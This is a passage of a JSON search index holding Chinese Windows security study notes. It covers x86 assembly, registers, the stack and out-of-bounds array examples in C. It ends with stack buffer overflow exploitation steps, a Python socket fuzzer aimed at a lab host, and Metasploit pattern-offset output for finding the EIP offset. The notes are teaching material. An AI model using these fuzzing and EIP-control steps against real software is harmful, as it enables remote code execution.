CALL\u6307\u4ee4\u8df3\u8f6c\u5230\u6307\u5b9a\u51fd\u6570 3. \u88ab\u8c03\u51fd\u6570\u914d\u7f6e\u4e00\u4e2a\u6307\u9488\u7528\u6765\u4fdd\u5b58\u4fdd\u6301\u4e0d\u53d8\u7684\u5bc4\u5b58\u5668\u503c 4. \u4e3a\u88ab\u8c03\u51fd\u6570\u5c40\u90e8\u53d8\u91cf\u5728\u6808\u4e0a\u5206\u914d\u7a7a\u95f4\uff0cPUSH\u6307\u4ee4 5. \u88ab\u8c03\u51fd\u6570\u6267\u884c\u8fc7\u7a0b\uff0c\u8bbf\u95ee\u53c2\u5bc4\u5b58\u5668\u7684\u53c2\u6570\uff0c\u5e76\u7ed9\u5bc4\u5b58\u5668\u8fd4\u56de\u7ed3\u679c 6. \u88ab\u8c03\u51fd\u6570\u6267\u884c\u5b8c\u6210\u540e\uff0c\u91ca\u653e\u6808\u7a7a\u95f4\uff0cPOP\u6307\u4ee4 7. \u8fd8\u539f\u7b2c3\u6b65\u4e2d\u7684\u503c 8. \u51fd\u6570\u8fd4\u56de\uff0cRET\u6307\u4ee4 9. \u8c03\u7528\u8005\u8fd8\u539f\u5bc4\u5b58\u5668\u7684\u503c 3-4\u5c5e\u4e8e\u51fd\u6570\u5e8f\u8a00 6-8\u5c5e\u4e8e\u51fd\u6570\u5c3e\u58f0","title":"\u51fd\u6570\u7684\u6d41\u7a0b"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_9","text":"\u51fd\u6570\u5e8f\u8a00(function prolog)\u662f\u51fd\u6570\u5f00\u59cb\u65f6\u7684\u6307\u4ee4\u5e8f\u5217\uff0c\u4e3a\u4e86EBP\u4e2d\u7684\u503c\u5728\u51fd\u6570\u6267\u884c\u671f\u95f4\u4fdd\u6301\u4e0d\u53d8\uff0c\u597d\u8ba9EBP\u53ef\u4ee5\u7528\u4e8e\u8bbf\u95ee\u5c40\u90e8\u53d8\u91cf\u548c\u53c2\u6570\u3002\u5b83\u901a\u5e38\u770b\u8d77\u6765\u50cf\u4e0b\u9762\u7684\u4ee3\u7801\u7247\u6bb5: push ebp mov ebp, esp sub esp, X \u51fd\u6570\u5c3e\u58f0\u91ca\u653e\u6808\u4e2d\u5206\u914d\u7684\u7a7a\u95f4\uff0c\u5c06EBP\u5bc4\u5b58\u5668\u4e2d\u7684\u503c\u8fd4\u56de\u5230\u5176\u521d\u59cb\u72b6\u6001\uff0c\u5e76\u5c06\u63a7\u5236\u6d41\u8fd4\u56de\u7ed9\u8c03\u7528\u8005 mov esp, ebp pop ebp ret 0 \u51fd\u6570\u5e8f\u8a00\u548c\u5c3e\u58f0\u901a\u5e38\u5728\u53cd\u6c47\u7f16\u7a0b\u5e8f\u4e2d\u68c0\u6d4b\uff0c\u7528\u4e8e\u51fd\u6570\u5b9a\u754c \u4e0b\u9762\u662f\u5728linux\u4e0a\u751f\u4ea7\u7684\u6c47\u7f16\u7801","title":"\u51fd\u6570\u5e8f\u8a00\u548c\u5c3e\u58f0"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_10","text":"\u5728\u6c47\u7f16\u4e2d\u5168\u5c40\u53d8\u91cf\u4f1a\u88ab\u81ea\u52a8\u521d\u59cb\u5316\u4e3a0\uff0c\u5c40\u90e8\u53d8\u91cf\u4e0d\u4f1a","title":"\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u53d8\u91cf"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_11","text":"General Purpose Registers (GPR) RAX - accumulator register \u7d2f\u52a0\u5668\u5bc4\u5b58\u5668\u3002\u901a\u5e38\u7528\u4e8e\u5b58\u50a8\u51fd\u6570\u7684\u8fd4\u56de\u503c RBX - base register \u57fa\u7840\u5bc4\u5b58\u5668\u3002\u6709\u65f6\u7528\u4f5c\u5185\u5b58\u8bbf\u95ee\u7684\u57fa\u51c6\u6307\u9488 RDX - data register \u6570\u636e\u5bc4\u5b58\u5668 RCX - counter register \u6709\u65f6\u88ab\u79f0\u4e3a\u8ba1\u6570\u5668\u5bc4\u5b58\u5668\u3002\u7528\u4f5c\u5faa\u73af\u8ba1\u6570\u5668 RSI - source index \u88ab\u79f0\u4e3a\u6e90\u7d22\u5f15\u3002\u7528\u4e8e\u5b57\u7b26\u4e32\u64cd\u4f5c\u7684\u6e90\u6307\u9488\u3002 RDI - destination index \u79f0\u4e3a\u76ee\u6807\u7d22\u5f15\u3002\u5728\u5b57\u7b26\u4e32\u64cd\u4f5c\u4e2d\u7528\u4f5c\u76ee\u6807\u6307\u9488 RSP - stack pointer \u6808\u6307\u9488\u3002\u4fdd\u5b58\u6808\u9876\u90e8\u7684\u5730\u5740\u3002 RBP - base pointer \u57fa\u6307\u9488\u3002\u4fdd\u5b58\u5806\u6808\u5e95\u90e8\u7684\u5730\u5740\u3002 EIP/RIP - Instruction Pointer \u6307\u4ee4\u6307\u9488\u3002\u4fdd\u5b58\u4e0b\u4e00\u884c\u8981\u6267\u884c\u4ee3\u7801\u7684\u5730\u5740","title":"\u5bc4\u5b58\u5668"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_12","text":"CPU\u662f\u4e00\u6b65\u6b65\u8fdb\u5316\u800c\u6765\u7684\uff0c\u6240\u4ee5\u9488\u5bf9\u4e0d\u540c\u4f4d\u6570\u6709\u4e0d\u540c\u7684\u5bc4\u5b58\u5668\u3002 R\u5f00\u5934\u7684\u5bc4\u5b58\u5668\u662f64\u4f4d\u7a0b\u5e8f\u7684 \u5927\u5c0f8\u5b57\u8282 E\u5f00\u5934\u7684\u5bc4\u5b58\u5668\u662f32\u4f4d\u7a0b\u5e8f\u7684 \u5927\u5c0f4\u5b57\u8282 A\u5f00\u5934\u7684\u5bc4\u5b58\u5668\u662f16\u4f4d\u7a0b\u5e8f\u7684 \u5927\u5c0f2\u5b57\u8282 \u5728\u4e00\u4e2a64\u4f4d\u7a0b\u5e8f\u4e2d\uff0c\u540c\u65f6\u5b58\u572864\u4f4d\u300132\u4f4d\u300116\u4f4d\u30018\u4f4d\u5bc4\u5b58\u5668\u3002 \u6bd4\u5982\uff0c64\u4f4d\u4e2dRAX\u7684\u540e32\u4f4d\u4e3aEAX\uff0c\u540e16\u4f4d\u4e3aAX\uff0816\u4f4d\u4e3a\u9ad8\u4f4dAH\u548c\u4f4e\u4f4dAL\u7ec4\u6210\uff09","title":"\u4e0d\u540c\u4f4d\u6570\u7684\u5bc4\u5b58\u5668"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_13","text":"\u6d6e\u70b9\u6570\u503c\u88ab\u5b58\u50a8\u5728 YMM* \u5bc4\u5b58\u5668\u4e2d\uff0c\u5bf9\u5e94\u768432\u4f4d\u5bc4\u5b58\u5668\u662f XMM*","title":"\u5b58\u50a8\u6d6e\u70b9\u6570\u7684\u5bc4\u5b58\u5668"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_14","text":"R8 \u81f3 R15\u5bc4\u5b58\u5668\u7528\u6765\u5b58\u50a8\u6574\u5f62","title":"\u5b58\u50a8\u6574\u5f62\u7684\u5bc4\u5b58\u5668"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_15","text":"","title":"\u5185\u5b58\u6570\u636e\u7ed3\u6784"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_16","text":"Stack \u6808 Heap \u5806 .data \u5305\u542b\u521d\u59cb\u5316\u4e3a\u975e\u96f6\u503c\u7684\u5168\u5c40\u548c\u9759\u6001\u6570\u636e .bss \u5305\u542b\u672a\u521d\u59cb\u5316\u6216\u521d\u59cb\u5316\u4e3a\u96f6\u7684\u5168\u5c40\u548c\u9759\u6001\u6570\u636e .text \u5305\u542b\u7a0b\u5e8f\u7684\u4ee3\u7801 \u4e0a\u56fe\u7684\u4ecb\u7ecd \u6808 - \u5b58\u50a8\u56fa\u5b9a\u5927\u5c0f\u6570\u636e\uff0c\u540e\u8fdb\u5148\u51fa\u539f\u5219\uff0c\u5165\u6808RSP\u4f1a\u589e\u52a0\uff0c\u51fa\u6808RSP\u4f1a\u51cf\u5c0f\uff0cRBP\u59cb\u7ec8\u4e0d\u53d8 \u5806 - \u53ef\u53d8\u7684\u5b58\u50a8\u7a7a\u95f4 \u7a0b\u5e8f\u955c\u50cf - \u8f7d\u5165\u5230\u5185\u5b58\u4e2d\u7684PE\u6587\u4ef6 TEB - \u7ebf\u7a0b\u73af\u5883\u5757 PEB - \u8fdb\u7a0b\u73af\u5883\u5757","title":"\u5185\u5b58\u7ed3\u6784"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_17","text":"\u6808\u7684\u57fa\u7840\u5355\u5143","title":"\u6808\u5e27"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_18","text":"\u4e00\u79cd\u5185\u5b58\u6570\u636e\u7684\u6392\u5217\u65b9\u5f0f\uff0c\u8fd9\u5c06\u5f71\u54cd\u5230\u8c03\u8bd5\u8fc7\u7a0b\u4e2d\u770b\u5230\u5185\u5b58\u7684\u6570\u636e\u987a\u5e8f\u95ee\u9898\uff0c\u9ed8\u8ba4\u662f\u91c7\u7528\u5c0f\u7aef\u5e8f\u6765\u5728\u5185\u5b58\u4e2d\u5b58\u50a8\u6570\u636e\u7684\uff0c\u8fd9\u4e5f\u5c31\u662f\u4e3a\u4ec0\u4e48\u5728\u5185\u5b58\u4e2d\u770b\u5230\u7684\u6570\u636e\u548c\u5b9e\u9645\u7684\u6570\u636e\u662f\u76f8\u53cd\u7684 \u5927\u7aef\u5e8f\uff1a \u5c0f\u503c\u5b58\u9ad8\u4f4d\uff0c\u5927\u503c\u5b58\u4f4e\u4f4d \u5c0f\u7aef\u5e8f\uff1a \u5927\u503c\u5b58\u4f4e\u4f4d\uff0c\u5c0f\u503c\u5b58\u9ad8\u4f4d","title":"\u7aef\u5e8f"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_19","text":"\u6808\u7684\u589e\u957f\u662f\u4ece\u5927\u5230\u5c0f\u7684\uff0c\u6808\u5e95\u662f\u5927\u5730\u5740\uff0c\u6808\u9876\u662f\u5c0f\u5730\u5740\u3002\u5165\u6808\u4f1a\u51cf\u5c0f\u6808\u9876\u5730\u5740\uff0c\u51fa\u6808\u4f1a\u589e\u5927\u6808\u9876\u5730\u5740\u3002 \u4f7f\u7528\u65e0\u9650\u5faa\u73af\u9012\u5f52\u4f1a\u5bfc\u81f4\u6808\u6ea2\u51fa void main() { main(); } \u7f16\u8bd1\u5668\u5173\u95ed\u4f18\u5316 RSP\u5230\u6700\u5c0f\u503c\u4e86","title":"\u6808"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_20","text":"\u76f4\u63a5\u503c\u3001\u5bc4\u5b58\u5668\u3001\u5185\u5b58/\u5185\u5b58\u5730\u5740 \u6c47\u7f16\u6307\u4ee4\u7684\u683c\u5f0f \u64cd\u4f5c\u7b26 \u76ee\u6807,\u6e90 mov RAX, 5 \u5206\u53f7 ; \u540e\u9762\u4ee3\u8868\u6ce8\u91ca","title":"\u6307\u4ee4"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_21","text":"MOV - \u5c06\u6e90\u64cd\u4f5c\u6570\u79fb\u52a8/\u5b58\u50a8\u5230\u76ee\u6807\u64cd\u4f5c\u6570 LEA - Load Effective Address \u52a0\u8f7d\u6709\u6548\u5730\u5740\uff0c\u4e0eMOV\u529f\u80fd\u76f8\u540c\uff0c\u5e38\u7528\u6765\u8ba1\u7b97\u5730\u5740 POSH - \u5165\u6808 POP - \u51fa\u6808 INC - \u52a01 DEC - \u51cf1 ADD - \u76f8\u52a0\uff0cadd RAX, RBX \u53ef\u4ee5\u770b\u6210 RAX += RBX SUB - \u76f8\u51cf\uff0csub RAX, RBX \u53ef\u4ee5\u770b\u6210 RAX -= RBX MUL/IMUL - \u76f8\u4e58\uff0cMUL\u662f\u65e0\u7b26\u53f7\u7ed3\u679c\uff0cIMUL\u662f\u6709\u7b26\u53f7\u7ed3\u679c DIV/IDIV - \u76f8\u9664\uff0c\u65e0\u7b26\u53f7\u548c\u6709\u7b26\u53f7 AL - eax\u7684\u4f4e8\u4f4d TEST - \u6309\u4f4d\u8fdb\u884cAND\u64cd\u4f5c\uff0c\u6839\u636e\u8fd0\u7b97\u7ed3\u679c\u8bbe\u7f6e\u7b26\u53f7\u6807\u5fd7\u4f4d\u3001\u96f6\u6807\u5fd7\u4f4d\u548c\u5947\u5076\u6807\u5fd7\u4f4d CMP - \u6bd4\u8f83\uff0c\u5b9e\u9645\u4e0a\u662f\u51cf\u6cd5SUB\uff0c\u4e0d\u540c\u7684\u662fSUB\u4f1a\u6539\u53d8\u76ee\u6807\u503c\uff0c\u800cCMP\u4e0d\u4f1a\uff0cCMP\u6539\u53d8\u7684\u662f\u6807\u5fd7\u4f4d\u3002\u5982CMP RAX, RCX \u5219\u662fRAX=RAX-RCX\uff0c\u5bf9\u6807\u5fd7\u4f4dZF\u3001SF\u3001CF/OF\u4ea7\u751f\u5f71\u54cd RET - \u5feb\u901f\u8fd4\u56de NOP - \u586b\u5145\u7b26 JB - \u65e0\u7b26\u53f7\u8ba1\u7b97\uff0c\u6839\u636e\u6807\u5fd7\u4f4d\u8df3\u8f6c JL - \u6709\u7b26\u53f7\u8ba1\u7b97\uff0c\u5c0f\u4e8e\u8df3\u8f6c\u3002\u6807\u5fd7\u4f4d\u8df3\u8f6c\uff0cSF<>OF\u8df3\u8f6c JLE - \u5c0f\u4e8e\u7b49\u4e8e\u8df3\u8f6c\u3002\u770b\u6807\u5fd7\u4f4d\u65f6\uff0cZF=1 \u6216 SF<>OF\u65f6 \u8df3\u8f6c JE - \u7b49\u4e8e\u8df3\u8f6c\uff0cZF\u4e3a1\u8df3\u8f6c TEST - \u5728\u4e24\u4e2a\u64cd\u4f5c\u6570\u7684\u5bf9\u5e94\u4f4d\u4e4b\u95f4\u8fdb\u884c AND \u64cd\u4f5c\uff0c\u5e76\u6839\u636e\u8fd0\u7b97\u7ed3\u679c\u8bbe\u7f6e\u7b26\u53f7\u6807\u5fd7\u4f4d\u3001\u96f6\u6807\u5fd7\u4f4d\u548c\u5947\u5076\u6807\u5fd7\u4f4d\u3002 movsxd - \u5e26\u7b26\u53f7\u6570\u7684\u6269\u5c55\u3002\u5f80\u5f80\u662f\u4e3a\u4e86\u4ece\u4f4e\u4f4d\u5f80\u9ad8\u4f4d\u6269\u5c55\u65f6\u9700\u8981\uff0c16\u4f4d\u6269\u5c55\u523032\u4f4d JCC - \u662f\u4e00\u7ec4\u6307\u4ee4\uff0c\u6839\u636e\u6807\u5fd7\u4f4dZF\u5224\u65ad\u662f\u5426\u8df3\u8f6c\uff0c\u5305\u542bJNE\u3001JLE\u3001JNZ\u7b49\u3002\u662f\u7528\u6765\u6bd4\u8f83\u5927\u5c0f\u7684\uff0c\u4f46\u662f\u5185\u90e8\u903b\u8f91\u662fSUB\uff0c\u7136\u540e\u6839\u636e\u6807\u5fd7\u4f4d\u8df3\u8f6c\uff0c\u8be6\u7ec6\u89c1\u4e0b\u56fe \u4e0b\u9762\u662f\u6709\u7b26\u53f7\u6570\u7684\u64cd\u4f5c\uff0c\u5373\u5305\u542b\u8d1f\u6570\u6bd4\u8f83 JNE - \u76ee\u6807\u4e0d\u7b49\u4e8e\u6e90\u65f6\u8df3\u8f6c\u3002\u5224\u65ad\u662f\u5426ZF\u662f\u5426\u7b49\u4e8e1\uff0cZF\u4e3a1\u5219\u7ee7\u7eed\uff0c\u4e3a0\u5219\u8df3\u8f6c JLE - \u76ee\u6807\u5c0f\u4e8e\u7b49\u4e8e\u6e90\u65f6\u8df3\u8f6c JGE - \u76ee\u6807\u5927\u4e8e\u7b49\u4e8e\u6e90\u65f6\u8df3\u8f6c \u4e0b\u9762\u662f\u65e0\u7b26\u53f7\u6570\u7684\u64cd\u4f5c\uff0c\u5373\u4e0d\u5305\u542b\u8d1f\u6570\u6bd4\u8f83 JBE - \u5c0f\u4e8e\u7b49\u4e8e\u8df3\u8f6c\uff0cCF=1\u6216ZF=1\u8df3\u8f6c JAE - \u5927\u4e8e\u7b49\u4e8e\u8df3\u8f6c\uff0c CALL - \u51fd\u6570\u8c03\u7528\uff0c\u76f8\u5f53\u4e8ePUSH\u540eJMP RET - \u51fd\u6570\u8fd4\u56de\uff0c \u76f8\u5f53\u4e8ePOP\u540eJMP JMP - \u8df3\u8f6c\u6307\u4ee4 JMP\u7684\u6307\u4ee4\u7684\u503c\u4ee5EB\u5f00\u5934\uff0cEB\u540e\u9762\u4ee3\u8868\u8df3\u8f6c\u7684\u4f4d\u7f6e\uff0c\u4fee\u6539EB\u540e\u9762\u7684\u503c\u4e3a00\u53ef\u4ee5\u8ba9JMP\u4e0d\u8df3\u8f6c\u800c\u7ee7\u7eed\u6267\u884c\u4e0b\u4e00\u6761\u6307\u4ee4 cdqe - \u6269\u5c55eax\u5230rax\uff0c\u4ece32\u4f4d\u6269\u5c55\u523064\u4f4d","title":"\u5e38\u89c1\u6307\u4ee4"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_22","text":"\u65b9\u62ec\u53f7 [] \u4e2d\u7684\u6570\u636e\u4ee3\u8868\u7684\u662f\u4e00\u4e2a\u5730\u5740\uff0c\u4f7f\u7528 LEA \u6765\u5bf9\u5730\u5740\u8fdb\u884c\u64cd\u4f5c lea RAX, [RCX+8] ;\u8fd9\u662f\u8ba1\u7b97\u5730\u5740\u7684 mov RAX, [RCX+8] ;\u8fd9\u662f\u8ba1\u7b97\u503c\u7684","title":"\u6307\u4ee4\u4e2d\u7684\u6307\u9488"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_23","text":"ZF - Zero Flag \u5728\u64cd\u4f5c\u7ed3\u679c\u4e3a\u96f6\u65f6\u8bbe\u7f6e\u4e3a1\u3002\u5982\u679c\u64cd\u4f5c\u7684\u7ed3\u679c\u4e0d\u4e3a\u96f6\uff0c\u5219\u4e0d\u8bbe\u7f6e CF - Carry Flag \u65e0\u7b26\u53f7\u6570\u503c\uff0c\u4ea7\u751f\u501f\u4f4d\u548c\u8fdb\u4f4d\u65f6\uff0c\u8bbe\u7f6e\u4e3a1 OF - Overflow Flag \u6709\u7b26\u53f7\u6570\u503c\uff0c\u4ea7\u751f\u501f\u4f4d\u548c\u9519\u4f4d\u65f6\uff0c\u8bbe\u7f6e\u4e3a1 SF - Sign Flag \u64cd\u4f5c\u7ed3\u679c\u4e3a\u8d1f\u6570\u65f6\uff0c\u8bbe\u7f6e\u4e3a1 AF? - Adjust/Auxiliary Flag \u4e0eCF\u76f8\u540c\uff0c\u4f46\u7528\u4e8eBCD\u64cd\u4f5c\uff08BCD\u64cd\u4f5c\u662f\u4ec0\u4e48\u64cd\u4f5c\uff09 PF - Parity Flag \u5982\u679c\u540e8\u4f4d\u4e2d\u76841\u662f\u5076\u6570\u4f4d\uff0c\u5219\u8bbe\u7f6e\u4e3a1 TF - Trap Flag \u4e3a1\u65f6\uff0c\u5141\u8bb8\u5355\u6b65\u6267\u884c\u7a0b\u5e8f DF - \u53c2\u8003\u8d44\u6599\uff1a https://www.tech-recipes.com/rx/1239/assembly-flags/","title":"\u6807\u5fd7\u4f4d"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_24","text":"","title":"\u6c47\u7f16\u4e2d\u7684\u6d41\u7a0b\u63a7\u5236"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#case","text":"\u901a\u8fc7jmp\u8df3\u8f6cecx*4\u7684\u5730\u5740\uff0c\u6839\u636e$LN11@f\u4e2d\u4e0d\u540c\u8868\u7684\u503c\u8fdb\u884c\u5206\u652f\u9009\u62e9","title":"case"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#for","text":"for\u5faa\u73af\u4e00\u5b9a\u6709\u4e00\u4e2a\u88ab\u521d\u59cb\u5316\u7684\u503c\u4f5c\u4e3a\u7d22\u5f15\uff0c\u901a\u5e38\u88ab\u8d4b\u7ed9ESI\uff0c\u7136\u540e\u6bd4\u8f83ESI\u548c\u53e6\u5916\u4e00\u4e2a\u503c\uff0c\u5e76\u4f1a\u8df3\u8f6c\u56de\u53bb","title":"For\u5faa\u73af"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_25","text":"\u4e58\u6cd5\u901a\u5e38\u7528\u52a0\u6cd5\u3001\u51cf\u6cd5\u548c\u5de6\u79fb\u6765\u66ff\u4ee3 \u5de6\u79fb\u7684\u539f\u7406\u662f\uff0c\u5f53\u88ab\u4e58\u6570\u80fd\u88ab2\u9664\u5c3d\u65f6\uff0c\u53ea\u9700\u8981\u518d\u6700\u53f3\u8fb9\u52a0\u4e0a[\u88ab\u9664\u6570/2]\u6570\u91cf\u76840\u5373\u53ef\uff0c\u88ab\u9664\u6570\u662f2\u30014\u30018\u300116\u300132....\u8fd9\u4e9b\u6570\u5b57\u65f6\u53ef\u4ee5\u4f7f\u7528\u5de6\u79fb\u66ff\u4ee3\u4e58\u6cd5 \u9664\u6cd5\u4e5f\u662f\u7c7b\u4f3c\uff0c\u4f46\u662f\u662f\u53f3\u79fb\u4e14\u4f4e\u4f4d\u88ab\u4e22\u5f03","title":"\u6c47\u7f16\u4e2d\u7684\u7b97\u672f"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_26","text":"x86\u4e2d\u7684\u6d6e\u70b9\u6570\u7531FPU\u6765\u5b8c\u6210\u5904\u7406\uff0cST(0)\u2026ST(7)\uff0c\u6709\u4e00\u7ec4\u53ef\u4ee5\u5bb9\u7eb38*80\u5b57\u8282\u7684\u6808","title":"\u6c47\u7f16\u4e2d\u7684\u6d6e\u70b9\u6570"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_27","text":"vscode\u7684\u9009\u9879\u4f1a\u9632\u6b62\u7f13\u51b2\u533a\u6ea2\u51fa /rtc\u5806\u6808\u5e27\u8fd0\u884c\u65f6\u68c0\u67e5 /GZ\u542f\u7528\u5806\u6808\u68c0\u67e5(/ rtc) \u6570\u7ec4\u8d8a\u754c\u8bfb\u53d6 #include <stdio.h> int main() { int a[20]; int i; for (i=0; i<20; i++) a[i]=i*2; printf (\"a[20]=%d\\n\", a[20]); //\u5f53a\u6570\u7ec4\u7684\u7d22\u5f15\u8fd8\u6ca1\u523020\u65f6\uff0c\u8fd9\u91cc\u5c31\u8bfb\u53d6\u4e8620 return 0; }; \u4f7f\u7528cl\u76f4\u63a5\u7f16\u8bd1\uff0c\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u679c\u662f a[20]=1175513387 4610E92B \u6570\u7ec4\u8d8a\u754c\u5199\u5165 #include <stdio.h> int main() { int a[20]; int i; for (i=0; i<30; i++) //\u8fd9\u91cc\u5faa\u73af\u7d22\u5f15\u6700\u5927\u662f29 a[i]=i; //\u5faa\u73af\u7d22\u5f15\u8d4b\u7ed9\u4e86\u6570\u7ec4\u7684\u7d22\u5f15\uff0c\u5faa\u73af\u7d22\u5f15\u5927\u4e8e\u6570\u7ec4\u7d22\u5f15\uff0c\u5bfc\u81f4\u8d8a\u754c\u5199\u5165\u3002\u6839\u672c\u4e0d\u5b58\u5728a[29]\uff0c\u8981\u5982\u4f55\u7ed9a[29]\u8d4b\u503c\u5462\uff1f return 0; }; \u4e00\u76f4\u5199\u5165\u4e8629\u4e2a\u503c\u5230\u6808\u4e2d\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f1a\u5728\u5c1d\u8bd5\u5f80\u6570\u7ec4\u5199\u5165a[21]\u65f6\u4ea7\u751f\u5f02\u5e38","title":"\u7f13\u51b2\u533a\u6ea2\u51fa"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_28","text":"\u5f71\u54cd\uff1a\u8d8a\u754c\u5199\u5165\u53ef\u9020\u6210RCE \u4e00\u4e2a\u57fa\u7840\u7684\u8d8a\u754c\u5199\u5165\u7f13\u5b58\u6ea2\u51fa\u5229\u7528\u6b65\u9aa4 1. \u627e\u5230\u89e6\u53d1\u7f13\u5b58\u6ea2\u51fa\u7684\u70b9\uff0c\u4e5f\u5c31\u662f\u627e\u5230\u53ef\u5bf9ESP\u64cd\u4f5c\u7684\u8f93\u5165\u70b9 2. \u627e\u5230EIP\u7684\u504f\u79fb\u4f4d\u7f6e\u4ee5\u4fbf\u4fee\u6539EIP 3. \u627e\u5230\u53ef\u91cd\u5b9a\u5411\u4ee3\u7801\u6267\u884c\u6d41\u7684\u6307\u4ee4\u7684\u5730\u5740(jmp esp\u3001ret esp\u7b49) 4. \u5c06EIP\u7684\u503c\u66ff\u6362\u4e3a\u91cd\u5b9a\u5411\u4ee3\u7801\u6267\u884c\u6d41\u8bed\u53e5\u7684\u5730\u5740 5. \u627e\u5230\u7a0b\u5e8f\u7684\u574f\u5b57\u7b26 6. \u6784\u9020\u6ca1\u6709\u574f\u5b57\u7b26\u7684shellcode,\u5728shellcode\u524d\u7528\u6570\u4e2anop\u586b\u5145\u9632\u6b62\u91cd\u5b9a\u5411\u6307\u4ee4\u8df3\u8fc7\u754c 7. \u53d1\u9001payload","title":"\u8d8a\u754c\u5199\u5165\u5229\u7528"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#a","text":"\u627e\u5230\u53ef\u63a7\u8f93\u5165\u70b9\u7684\u6ea2\u51fa\u8fb9\u754c \u7b2c\u4e00\u6b65\u9700\u8981\u641e\u6e05\u695a\u591a\u5c11\u5b57\u8282\u4f1a\u9020\u6210\u6ea2\u51fa\uff0c\u6ea2\u51fa\u7684\u8fb9\u754c\u5728\u54ea\u3002 \u8fd9\u91cc\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u63a7\u5236\u53f0\u7a0b\u5e8f\u6765\u4f5c\u4e3a\u7ec3\u4e60\u3002 \u7528\u811a\u672c\u81ea\u52a8\u5316\u6d4b\u8bd5\u8fd9\u4e2a\u8f93\u5165\u70b9\u53ef\u4ee5\u63a5\u6536\u591a\u5927\u5b57\u8282\u7684\u6570\u636e import socket import sys ip = \"192.168.14.139\" port = 31337 string = b\"\\xfc\" * 10 s = socket.socket() s.connect((ip, port)) timeout = 3 s.settimeout(timeout) while True: try: print(\"Fuzzing with {} bytes\".format(len(string))) s.send(string + b\"\\x0a\\x0d\") string += b\"\\xfc\" * 10 s.recv(1024) except: print(\"Fuzzer crashed at {} bytes\".format(len(string))) sys.exit(0) s.close() \u8dd1\u5230160\u5b57\u8282\u65f6\u7a0b\u5e8f\u5d29\u6e83 \u627e\u5230EIP\u7684\u504f\u79fb\u91cf EIP/RIP\u5bc4\u5b58\u5668\u662f\u6307\u4ee4\u6307\u9488\uff0c\u4fdd\u5b58\u4e86\u4e0b\u4e00\u884c\u8981\u6267\u884c\u4ee3\u7801\u7684\u5730\u5740\u3002 \u7531\u4e8e\u662f160\u5b57\u8282\u7a0b\u5e8f\u4ea7\u751f\u4e86\u5d29\u6e83\uff0c\u76f4\u63a5\u81ea\u5b9a\u4e49\u4e00\u6bb5300\u5b57\u8282\u7684\u6570\u636e\u53d1\u9001\uff0c\u901a\u8fc7\u7a0b\u5e8f\u5d29\u6e83\u65f6EIP\u7684\u503c\u6765\u627e\u5230EIP\u7684\u504f\u79fb\u91cf \u6b64\u65f6EIP\u7684\u503c\u4e3a39654138 \u2514\u2500# msf-pattern_offset -l 300 -q 39654138 [*] Exact match at offset 146 \u504f\u79fb\u91cf\u662f146\u5b57\u8282\uff0c\u4e5f\u5c31\u662f\u8bf4\u8f93\u5165\u70b9\u7684\u6700\u5927\u8f93\u5165\u662f146\u4e2a\u5b57\u8282\uff0c\u5728\u6b64\u4e4b\u540e\u662fEIP\u7684\u5730\u5740\u3002\u6b64\u65f6\u53d1\u9001146\u4e2a\u5b57\u8282\uff0c\u5e76\u5728\u540e\u9762\u8ddf\u4e0a4\u4e2a\u5b57\u8282\uff0c\u5c31\u53ef\u4ee5\u63a7\u5236EIP\u7684\u503c\u3002 